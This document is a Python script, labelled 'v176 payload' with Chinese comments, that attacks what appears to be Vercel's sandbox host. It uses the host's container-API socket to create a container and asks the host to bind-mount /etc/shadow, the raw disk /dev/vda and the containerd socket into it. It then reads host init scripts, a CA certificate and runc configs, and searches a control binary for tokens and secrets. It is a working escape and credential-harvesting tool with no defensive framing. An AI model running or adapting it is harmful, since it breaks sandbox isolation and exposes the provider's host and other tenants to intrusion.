# -*- coding: utf-8 -*-
"""v176 payload: Mount 生效验证 + 宿主文件读取 + celld-init/runc config/sandboxctrl 提取
输出 /vercel/sandbox/v176c.out"""
import socket, struct, time, json, os, signal, re, subprocess

OUT = '/vercel/sandbox/v176c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(275)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def find_proc(comm_list):
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in comm_list:
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:120].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                return d, comm, cl
    return None


# ============ 1: Create yes 容器 ============
log('=== 1 setup ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'yes'}).encode(), t=8)
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
pid = None
if cid:
    raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    time.sleep(1)
    fp = find_proc(['yes'])
    pid = fp[0] if fp else None
    log('yes pid=%s' % pid)
    # 容器 /dev 设备列表
    try:
        devs = sorted(os.listdir('/proc/%s/root/dev' % pid))
        log('CTR /dev: %s' % ' '.join(devs[:40]))
    except Exception as e:
        log('CTR /dev EXC %s' % e)
    # 容器 rootfs 结构
    try:
        roots = sorted(os.listdir('/proc/%s/root' % pid))
        log('CTR root: %s' % ' '.join(roots[:40]))
    except Exception as e:
        log('CTR root EXC %s' % e)

# ============ 2: Mount bind 宿主路径 + 验证 ============
log('=== 2 mount bind ===')
if pid:
    tests = [
        ('/etc/hostname', '/tmp/m1'),
        ('/proc/1/root/etc/hostname', '/tmp/m2'),
        ('/etc/shadow', '/tmp/m3'),
        ('/dev/vda', '/mnt/host1'),
        ('/run/containerd/containerd.sock', '/tmp/m4'),
    ]
    for src, dst in tests:
        body = json.dumps({'container_id': cid, 'mount': {
            'type': 'MOUNT_TYPE_BIND', 'source': src,
            'destination': dst, 'mode': 'MOUNT_MODE_READ_WRITE'}}).encode()
        st2, pay2 = raw_req(CELL, '%s/Mount' % CTRS, body, t=5)
        log('Mount %s -> %s -> %s %r' % (src, dst, st2, pay2[:120]))
        time.sleep(0.3)
        # 容器视角验证
        try:
            p = '/proc/%s/root%s' % (pid, dst)
            if os.path.isdir(p):
                lst = sorted(os.listdir(p))[:20]
                log('VERIFY %s DIR: %s' % (dst, ' '.join(lst)))
            elif os.path.exists(p):
                sz = os.path.getsize(p)
                data = open(p, 'rb').read(200)
                log('VERIFY %s FILE(%d): %r' % (dst, sz, data))
            else:
                log('VERIFY %s MISSING' % dst)
        except Exception as e:
            log('VERIFY %s EXC %s' % (dst, e))
    # Tmpfs mount 验证
    body = json.dumps({'container_id': cid, 'mount': {
        'type': 'MOUNT_TYPE_TMPFS', 'size': 1048576,
        'destination': '/tmp/tmpfs1', 'mode': 'MOUNT_MODE_READ_WRITE'}}).encode()
    st3, pay3 = raw_req(CELL, '%s/Mount' % CTRS, body, t=5)
    log('Mount tmpfs -> %s %r' % (st3, pay3[:120]))
    time.sleep(0.3)
    try:
        p = '/proc/%s/root/tmp/tmpfs1' % pid
        log('VERIFY tmpfs exists=%s' % os.path.exists(p))
    except Exception as e:
        log('VERIFY tmpfs EXC %s' % e)

# ============ 3: 容器内尝试 mount /dev/vda ============
log('=== 3 ctr mount vda ===')
if pid:
    # 从容器视角检查 /dev/vda 是否存在 (通过 /proc/pid/root)
    try:
        vda = '/proc/%s/root/dev/vda' % pid
        log('CTR /dev/vda exists=%s' % os.path.exists(vda))
    except Exception as e:
        log('CTR vda EXC %s' % e)

# ============ 4: 宿主文件读取 ============
log('=== 4 host files ===')
for p in ['/proc/1/root/opt/vercel/celld-init.sh',
          '/proc/1/root/var/run/cell/ca-cert.pem']:
    try:
        data = open(p, 'rb').read()
        log('FILE %s (%d):\n%s' % (p, len(data), data[:1500].decode(errors='replace')))
    except Exception as e:
        log('FILE %s EXC %s' % (p, e))
# runc config.json (我们容器的)
try:
    base = R + '/var/run/cell/runc'
    for d in sorted(os.listdir(base)):
        cfg = os.path.join(base, d, 'config.json')
        if os.path.exists(cfg):
            data = open(cfg, 'rb').read()
            log('RUNCCFG %s (%d):\n%s' % (d, len(data), data[:4000].decode(errors='replace')))
            break
except Exception as e:
    log('RUNCCFG EXC %s' % e)
# sandboxctrl exe (可能已删除)
try:
    exe = os.readlink('/proc/537/exe')
    log('SBC exe link=%s' % exe)
    data = open('/proc/537/exe', 'rb').read()
    log('SBC size=%d head=%r' % (len(data), data[:80]))
    # 找 /opt/vercel/ 字符串位置
    for kw in [b'/opt/vercel', b'sandboxctrl', b'api.vercel', b'token', b'secret']:
        i = data.find(kw)
        if i > 0:
            log('SBC %r @0x%x: %r' % (kw, i, data[i - 60:i + 200]))
except Exception as e:
    log('SBC EXC %s' % e)

# ============ 5: 完整方法列表 ============
log('=== 5 methods ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    pats = re.findall(rb'vercel\.hive\.cell\.api\.containers\.v1\.ContainersService/[A-Za-z]+', data)
    uniq = []
    for p in pats:
        s = p.decode(errors='replace')
        if s not in uniq:
            uniq.append(s)
    log('METHODS(%d): %s' % (len(uniq), ' '.join(uniq)))
except Exception as e:
    log('METHODS EXC %s' % e)

log('V176_DONE')
f.close()
